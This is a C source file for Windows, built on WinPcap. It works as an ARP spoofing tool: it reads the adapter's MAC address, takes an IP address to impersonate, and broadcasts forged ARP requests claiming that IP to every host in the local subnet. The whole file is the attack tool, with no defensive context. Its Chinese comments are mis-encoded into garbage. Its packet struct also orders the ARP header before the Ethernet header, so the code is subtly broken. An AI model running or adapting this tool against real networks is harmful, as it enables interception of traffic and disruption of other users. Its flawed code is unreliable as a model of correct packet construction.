

#define WIN32

#include "pcap.h"
#include "packet32.h" 
#include "ntddndis.h"

#define MAC_LEN 6

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"wpcap.lib")
#pragma comment(lib,"Packet.lib")


struct eth_header
{
	unsigned char dst_mac[MAC_LEN];
	unsigned char src_mac[MAC_LEN];
	unsigned short type;
};

struct arp_header
{
	unsigned short hard_type;
	unsigned short pro_type;
	unsigned char hard_len;
	unsigned char pro_len;
	unsigned short op;
	unsigned char mac_sender[MAC_LEN];
	unsigned long ip_sender;
	unsigned char mac_target[MAC_LEN];
	unsigned long ip_target;
};


struct arp_packet
{
	arp_header arp;
	eth_header eth;
};


/**
* ���������MAC��ַ
* pDevName �������豸����
*/
unsigned char* GetSelfMac(char* pDevName)
{
	static u_char mac[6];
	memset(mac, 0, sizeof(mac));
	LPADAPTER lpAdapter = PacketOpenAdapter(pDevName);

	if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE))
	{
		return NULL;
	}

	PPACKET_OID_DATA OidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA));
	if (OidData == NULL)
	{
		PacketCloseAdapter(lpAdapter);
		return NULL;
	}
	// 
	// Retrieve the adapter MAC querying the NIC driver 
	// 
	OidData->Oid = OID_802_3_CURRENT_ADDRESS;
	OidData->Length = 6;
	memset(OidData->Data, 0, 6);
	BOOLEAN Status = PacketRequest(lpAdapter, FALSE, OidData);

	if (Status)
	{
		memcpy(mac, (u_char*)(OidData->Data), 6);
	}
	free(OidData);
	PacketCloseAdapter(lpAdapter);

	return mac;
}

/*
* ��װARP�����
* source_mac ԴMAC��ַ
* srcIP ԴIP
* destIP Ŀ��IP
*/
unsigned char* BuildArpPacket(unsigned char* source_mac, unsigned long srcIP, unsigned long destIP)
{
	static struct arp_packet packet;

	//Ŀ��MAC��ַΪ�㲥��ַ��FF-FF-FF-FF-FF-FF 
	memset(packet.eth.dst_mac, 0xFF, 6);
	//ԴMAC��ַ 
	memcpy(packet.eth.src_mac, source_mac, 6);
	//�ϲ�Э��ΪARPЭ�飬0x0806 
	packet.eth.type = htons(0x0806);
	//Ӳ�����ͣ�Ethernet��0x0001 
	packet.arp.hard_type = htons(0x0001);
	//�ϲ�Э�����ͣ�IPΪ0x0800 
	packet.arp.pro_type = htons(0x0800);
	//Ӳ����ַ���ȣ�MAC��ַ����Ϊ0x06 
	packet.arp.hard_len = 0x06;
	//Э���ַ���ȣ�IP��ַ����Ϊ0x04 
	packet.arp.pro_len = 0x04;
	//������ARP����Ϊ1 
	packet.arp.op = htons(0x0001);
	//ԴMAC��ַ 
	memcpy(packet.arp.mac_sender, source_mac, 6);
	//ԴIP��ַ 
	packet.arp.ip_sender = srcIP;
	//Ŀ��MAC��ַ�����0 
	memset(packet.arp.mac_target, 0, 6);
	//Ŀ��IP��ַ 
	packet.arp.ip_target = destIP;
	//������ݣ�18���ֽ�
	//memset(packet.arp.padding, 0, 18);

	return (unsigned char*)&packet;
}



int main(int argc, char* argv[])
{
	pcap_if_t *alldevs;            //ȫ�������б� 
	pcap_if_t *d;                  //һ������ 
	int inum;                      //�û�ѡ���������� 
	int i = 0;                       //ѭ������ 
	pcap_t *adhandle;              //һ��pcapʵ�� 
	char errbuf[PCAP_ERRBUF_SIZE]; //���󻺳��� 
	unsigned char *mac;            //����MAC��ַ 
	unsigned char *packet;         //ARP�� 
	unsigned long fakeIp;          //Ҫαװ�ɵ�IP��ַ 
	pcap_addr_t *pAddr;            //������ַ 
	unsigned long ip;              //IP��ַ 
	unsigned long netmask;         //�������� 

								   /* �Ӳ����б��л��Ҫαװ��IP��ַ */
	
	if (argc != 2)
	{
		printf("Usage: %s inet_addr\n", argv[0]);
		return -1;
	}
	
	fakeIp = inet_addr(argv[1]);
	//fakeIp = inet_addr("10.3.8.211");
	if (INADDR_NONE == fakeIp)
	{
		fprintf(stderr, "Invalid IP: %s\n", argv[1]);
		return -1;
	}

	/* ��ñ��������б� */
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}
	for (d = alldevs; d; d = d->next)
	{
		printf("%d", ++i);
		if (d->description)
			printf(". %s\n", d->description);
		else
			printf(". No description available\n");
	}
	//���û�з������� 
	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}
	//�û�ѡ��һ������ 
	printf("Enter the interface number (1-%d):", i);
	scanf_s("%d", &inum, sizeof(int));

	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* �ƶ�ָ�뵽�û�ѡ������� */
	for (d = alldevs, i = 0; i< inum - 1; d = d->next, i++);

	mac = GetSelfMac(d->name); //+8��ȥ��"rpcap://"
	if (mac == NULL)
	{
		printf("\n����MAC��ַ��ȡʧ��.\n");
		return -1;
	}

	printf("����ARP��ƭ��������(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X) ��ͼαװ��%s\n",
		mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], argv[1]);

	/* ������ */
	if ((adhandle = pcap_open_live(d->name, // name of the device 
		65536,         // portion of the packet to capture 
		0,             // open flag 
		1000,          // read timeout 
		errbuf         // error buffer 
	)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		pcap_freealldevs(alldevs);
		return -1;
	}

	for (pAddr = d->addresses; pAddr; pAddr = pAddr->next)
	{
		//�õ��û�ѡ���������һ��IP��ַ 
		ip = ((struct sockaddr_in *)pAddr->addr)->sin_addr.s_addr;
		//�õ���IP��ַ��Ӧ���������� 
		netmask = ((struct sockaddr_in *)(pAddr->netmask))->sin_addr.S_un.S_addr;

		if (!ip || !netmask)
		{
			continue;
		}

		//�����IP��Ҫαװ��IP�Ƿ���ͬһ������
		if ((ip&netmask) != (fakeIp&netmask))
		{
			continue;       //�������һ������������������ַ�б�
		}

		unsigned long netsize = ntohl(~netmask); //������������
		unsigned long net = ip & netmask;        //������ַ

		for (unsigned long n = 1; n<netsize; n++)
		{
			//��į������IP��ַ�������ֽ�˳��
			unsigned long destIp = net | htonl(n);
			//�����ٵ�ARP��������ﵽ����αװ�ɸ�����IP��ַ��Ŀ��
			packet = BuildArpPacket(mac, fakeIp, destIp);

			if (pcap_sendpacket(adhandle, packet, 60) == -1)
			{
				fprintf(stderr, "pcap_sendpacket error.\n");
			}
		}
	}

	system("pause");
}
